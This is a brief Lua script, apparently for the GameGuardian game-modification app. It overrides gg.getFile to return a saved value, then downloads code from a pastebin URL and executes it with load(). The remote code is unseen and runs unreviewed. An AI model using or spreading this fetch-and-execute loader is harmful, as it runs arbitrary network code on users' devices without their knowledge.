local A = gg.getFile()gg.getFile = function () return A end local Vs = gg.makeRequest("https://pastebin.com/raw/Auu9k55q").content
 if Vs then
 print(load(Vs)) end

